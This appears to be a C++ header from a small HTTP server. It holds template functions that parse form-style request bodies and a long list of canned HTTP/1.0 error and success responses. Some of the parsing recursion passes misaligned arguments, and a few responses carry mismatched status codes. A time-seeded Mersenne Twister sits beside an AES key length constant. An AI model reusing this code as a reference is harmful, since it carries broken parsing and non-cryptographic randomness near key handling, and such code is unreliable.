template<typename SOURCE, typename SOURCELEN, typename DES, typename FINDWORD, typename FINDWORDLEN, typename ... ARGS>
static bool praseBodyUnsafe(const SOURCE *source, const SOURCELEN sourceLen, const DES **des, const FINDWORD *findWord, const FINDWORDLEN findWordLen,
	const SOURCE *iterBegin, const SOURCE *iterEnd, const SOURCE *iterLast, ARGS ... args);



template<typename SOURCE, typename SOURCELEN, typename DES, typename FINDWORD, typename FINDWORDLEN>
bool praseBodyUnsafe(const SOURCE *source, const SOURCELEN sourceLen, const DES **des, const FINDWORD *findWord, const FINDWORDLEN findWordLen,
	const SOURCE *iterBegin, const SOURCE *iterEnd, const SOURCE *iterLast)
{
	if (!std::equal(iterBegin, iterBegin + findWordLen, findWord, findWord + findWordLen))
		return false;

	iterBegin += findWordLen;

	if (iterBegin == iterLast || *iterBegin != '=')
		return false;

	++iterBegin;

	iterEnd = std::find(iterBegin, iterLast, '&');
	if (iterEnd != iterLast)
		return false;

	*des = iterBegin;
	*(++des) = iterEnd;

	return true;
}




template<typename SOURCE, typename SOURCELEN, typename DES, typename FINDWORD, typename FINDWORDLEN, typename ... ARGS>
bool praseBodyUnsafe (const SOURCE *source, const SOURCELEN sourceLen, const DES **des, const FINDWORD *findWord, const FINDWORDLEN findWordLen,
	const SOURCE *iterBegin, const SOURCE *iterEnd, const SOURCE *iterLast, ARGS ... args)
{
		if (!std::equal(iterBegin, iterBegin + findWordLen, findWord, findWord + findWordLen))
			return false;

		iterBegin += findWordLen;

		if (iterBegin == iterLast || *iterBegin != '=')
			return false;

		++iterBegin;

		iterEnd = std::find(iterBegin, iterLast, '&');
		if (iterEnd == iterLast)
			return false;

		*des = iterBegin;
		*(++des) = iterEnd;

		iterBegin = ++iterEnd;

		return praseBodyUnsafe(iterBegin, sourceLen - distance(source, iterBegin), ++des, iterBegin , iterBegin , iterBegin + (sourceLen - distance(source, iterBegin)) , args...);
}





template<typename SOURCE, typename SOURCELEN, typename DES, typename FINDWORD, typename FINDWORDLEN, typename ... ARGS>
bool praseBodyFast(const SOURCE *source, const SOURCELEN sourceLen, const DES **des, const FINDWORD *findWord, const FINDWORDLEN findWordLen, ARGS ... args)
{
	if (source && sourceLen && findWord && findWordLen <= sourceLen && des)
	{
		return praseBodyUnsafe(source, sourceLen , ++des, source, source, source + sourceLen, args...);
	}
	return false;
}



//  head&age=123&hello&world=5236&key
//  


template<typename SOURCE, typename SOURCELEN, typename DES, typename FINDWORD, typename FINDWORDLEN>
bool praseBodySafe(const SOURCE *source, const SOURCELEN sourceLen, const DES **des, const FINDWORD *findWord, const FINDWORDLEN findWordLen)
{
	if (source && sourceLen && findWord && findWordLen <= sourceLen && des)
	{
		const SOURCE *iterBegin{ source }, *iterEnd{ iterBegin }, *iterLast{ iterBegin + sourceLen };

		if (!std::equal(iterBegin, iterBegin + findWordLen, findWord, findWord + findWordLen))
			return false;

		iterBegin += findWordLen;

		if (iterBegin == iterLast)
		{
			*des = iterBegin;
			*(++des) = iterBegin;
		}
		else
		{
			if (*iterBegin != '=')
			{
				return false;
			}
			else
			{
				++iterBegin;
				iterEnd = std::find(iterBegin, iterLast, '&');
				if (iterEnd != iterLast)
					return false;

				*des = iterBegin;
				*(++des) = iterEnd;
			}
		}

		return true;
	}
	return false;
}




template<typename SOURCE, typename SOURCELEN, typename DES, typename FINDWORD, typename FINDWORDLEN, typename ... ARGS>
bool praseBodySafe(const SOURCE *source, const SOURCELEN sourceLen, const DES **des, const FINDWORD *findWord, const FINDWORDLEN findWordLen, ARGS ... args)
{
	if (source && sourceLen && findWord && findWordLen <= sourceLen && des)
	{
		const SOURCE *iterBegin{ source }, *iterEnd{ iterBegin }, *iterLast{ iterBegin + sourceLen };

		if (!std::equal(iterBegin, iterBegin + findWordLen, findWord, findWord + findWordLen))
			return false;

		iterBegin += findWordLen;

		if (iterBegin == iterLast)
			return false;


		if (*iterBegin == '&')
		{
			*des = iterBegin;
			*(++des) = iterBegin;
		}
		else if (*iterBegin == '=')
		{
			++iterBegin;
			iterEnd = std::find(iterBegin, iterLast, '&');
			if (iterEnd == iterLast)
				return false;

			*des = iterBegin;
			*(++des) = iterEnd;
			iterBegin = iterEnd;
		}
		else
			return false;

		++iterBegin;

		return praseBodySafe(iterBegin, sourceLen - distance(source, iterBegin), ++des, args...);
	}
	return false;
}



template<typename SOURCE, typename SOURCELEN, typename DES, typename ...ARGS>
bool praseBody(const SOURCE * source, const SOURCELEN sourceLen, const DES ** des, ARGS ...args)
{
	unsigned int argSize{ sizeof...(args) };
	if (source && sourceLen  && des && argSize && !(argSize % 2) && argSize <= 100)
		return praseBodySafe(source, sourceLen, des, args...);
	return false;
}


















////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////





namespace HTTPRESPONSE
{
	static const char *httpHead{ "HTTP/" };
	static int httpHeadLen{ strlen(httpHead) };

	static const char *OK200{ " 200 OK\r\n" };
	static int OK200Len{ strlen(OK200) };

	static const char *Access_Control_Allow_Origin{ "Access-Control-Allow-Origin:*\r\n" };
	static int Access_Control_Allow_OriginLen{ strlen(Access_Control_Allow_Origin) };

	static const char *Content_Length{ "Content-Length:" };
	static int Content_LengthLen{ strlen(Content_Length) };

	static const char *newline{ "\r\n\r\n" };
	static int newlineLen{ strlen(newline) };

	static const char *halfNewLine{ "\r\n" };
	static int halfNewLineLen{ strlen(halfNewLine) };

}



namespace HTTPRESPONSEREADY
{
	static const char *http10bodyToLong{ "HTTP/1.0 400 bad request\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:23\r\n\r\nBody length is too long" };
	static size_t http10bodyToLongLen{ strlen(http10bodyToLong) };

	////////////////////////////////////////////////

	static const char *http10OK{ "HTTP/1.0 200 OK\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:18\r\n\r\nHTTP request is OK" };
	static size_t http10OKLen{ strlen(http10OK) };

	//////////////////////////////////////////////////////////

	static const char *http10OKNoBodyJson{ "HTTP/1.0 200 OK\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:13\r\n\r\n{\"result\":\"\"}" };
	static size_t http10OKNoBodyJsonLen{ strlen(http10OKNoBodyJson) };


	static const char *http10OKNoBody{ "HTTP/1.0 400 bad request\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:0\r\n\r\n" };
	static size_t http10OKNoBodyLen{ strlen(http10OKNoBody) };

	static const char *http10OKConyentLength{ "HTTP/1.0 200 OK\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:" };
	static size_t http10OKConyentLengthLen{ strlen(http10OKConyentLength) };


	//////////////////////////////////////////////////

	static const char *http10invaild{ "HTTP/1.0 400 bad request\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:23\r\n\r\nHTTP request is invaild" };
	static size_t http10invaildLen{ strlen(http10invaild) };


	//////////////////////////////////////////////////////////////////////////////////////////////////

	static const char *http10sqlRow0{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:15\r\n\r\nRow number is 0" };
	static size_t http10sqlRow0Len{ strlen(http10sqlRow0) };


	///////////////////////////////////////////////////////////////////////////////

	static const char *http10sqlField0{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:17\r\n\r\nField number is 0" };
	static size_t http10sqlField0Len{ strlen(http10sqlField0) };


	///////////////////////////////////////////////////////////////////////////////

	static const char *http10sqlError{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:9\r\n\r\nSql error" };
	static size_t http10sqlErrorLen{ strlen(http10sqlError) };


	//////////////////////////////////////////////////////////////////////////////////

	static const char *http10sqlSizeTooBig{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:19\r\n\r\nSql size is too big" };
	static size_t http10sqlSizeTooBigLen{ strlen(http10sqlSizeTooBig) };


	///////////////////////////////////////////////////////////////////////////////////


	static const char *http10Pong{ "HTTP/1.0 200 OK\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:4\r\n\r\nPong" };
	static size_t http10PongLen{ strlen(http10Pong) };


	static const char *http10SqlQueryError{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:15\r\n\r\nSQL query error" };
	static size_t http10SqlQueryErrorLen{ strlen(http10SqlQueryError) };


	static const char *http10SqlNetAsyncError{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:19\r\n\r\nSQL net async error" };
	static size_t http10SqlNetAsyncErrorLen{ strlen(http10SqlNetAsyncError) };


	static const char *http10SqlResNull{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:15\r\n\r\nSQL res is null" };
	static size_t http10SqlResNullLen{ strlen(http10SqlResNull) };


	static const char *http10SqlQueryRowZero{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:18\r\n\r\nSQL query row zero" };
	static size_t http10SqlQueryRowZeroLen{ strlen(http10SqlQueryRowZero) };


	static const char *http10SqlQueryFieldZero{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:20\r\n\r\nSQL query field zero" };
	static size_t http10SqlQueryFieldZeroLen{ strlen(http10SqlQueryFieldZero) };


	static const char *httpUnknownError{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:13\r\n\r\nUnknown error" };
	static size_t httpUnknownErrorLen{ strlen(httpUnknownError) };


	static const char *httpFailToInsertSql{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:18\r\n\r\nFail to insert Sql" };
	static size_t httpFailToInsertSqlLen{ strlen(httpFailToInsertSql) };

	static const char *httpFailToInsertRedis{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:20\r\n\r\nFail to insert Redis" };
	static size_t httpFailToInsertRedisLen{ strlen(httpFailToInsertRedis) };


	static const char *httpInsertSqlWrite{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:31\r\n\r\nSuccess to insert sqlWrite list" };
	static size_t httpInsertSqlWriteLen{ strlen(httpInsertSqlWrite) };

	static const char *httpSTDException{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:13\r\n\r\nSTD exception" };
	static size_t httpSTDExceptionLen{ strlen(httpSTDException) };


	static const char *httpPasswordIsWrong{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:17\r\n\r\nPassword is wrong" };
	static size_t httpPasswordIsWrongLen{ strlen(httpPasswordIsWrong) };

	
	static const char *httpREDIS_ASYNC_WRITE_ERROR{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:23\r\n\r\nRedis async write error" };
	static size_t httpREDIS_ASYNC_WRITE_ERRORLen{ strlen(httpREDIS_ASYNC_WRITE_ERROR) };


	static const char *httpREDIS_ASYNC_READ_ERROR{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:22\r\n\r\nRedis async read error" };
	static size_t httpREDIS_ASYNC_READ_ERRORLen{ strlen(httpREDIS_ASYNC_READ_ERROR) };


	static const char *httpCHECK_REDIS_MESSAGE_ERROR{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:25\r\n\r\nCheck redis message error" };
	static size_t httpCHECK_REDIS_MESSAGE_ERRORLen{ strlen(httpCHECK_REDIS_MESSAGE_ERROR) };


	static const char *httpREDIS_READY_QUERY_ERROR{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:23\r\n\r\nRedis ready query error" };
	static size_t httpREDIS_READY_QUERY_ERRORLen{ strlen(httpREDIS_READY_QUERY_ERROR) };

	static const char *httpNO_KEY{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:6\r\n\r\nNo key" };
	static size_t httpNO_KEYLen{ strlen(httpNO_KEY) };


	static const char *httpNoMessage{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:10\r\n\r\nNo message" };
	static size_t httpNoMessageLen{ strlen(httpNoMessage) };


	static const char *http404Nofile{ "HTTP/1.0 404 NOFILE\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:0\r\n\r\n" };
	static size_t http404NofileLen{ strlen(http404Nofile) };


	static const char *httpNoRecordInSql{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:16\r\n\r\nNo record in sql" };
	static size_t httpNoRecordInSqlLen{ strlen(httpNoRecordInSql) };


	static const char *http10WrongPublicKey{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:15\r\n\r\nWrong publicKey" };
	static size_t http10WrongPublicKeyLen{ strlen(http10WrongPublicKey) };


	static const char *http10InvaildHash{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:12\r\n\r\nInvaild hash" };
	static size_t http10InvaildHashLen{ strlen(http10InvaildHash) };


	static const char *httpRSAencryptFail{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:16\r\n\r\nRSA encrypt fail" };
	static size_t httpRSAencryptFailLen{ strlen(httpRSAencryptFail) };


	static const char *httpRSAdecryptFail{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:16\r\n\r\nRSA decrypt fail" };
	static size_t httpRSAdecryptFailLen{ strlen(httpRSAdecryptFail) };


	static const char *httpAESsetKeyFail{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:19\r\n\r\nFail to set AES key" };
	static size_t httpAESsetKeyFailLen{ strlen(httpAESsetKeyFail) };


	static const char *httpFailToVerify{ "HTTP/1.0 500 Internal Server Error\r\nAccess-Control-Allow-Origin:*\r\nContent-Length:14\r\n\r\nFail to verify" };
	static size_t httpFailToVerifyLen{ strlen(httpFailToVerify) };
}





struct REDISNOKEY
{

};



static const char *randomString{"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" };
static size_t randomStringLen{ strlen(randomString) };


static std::mt19937 rdEngine{ std::chrono::high_resolution_clock::now().time_since_epoch().count() };


static size_t maxAESKeyLen{ 32 };



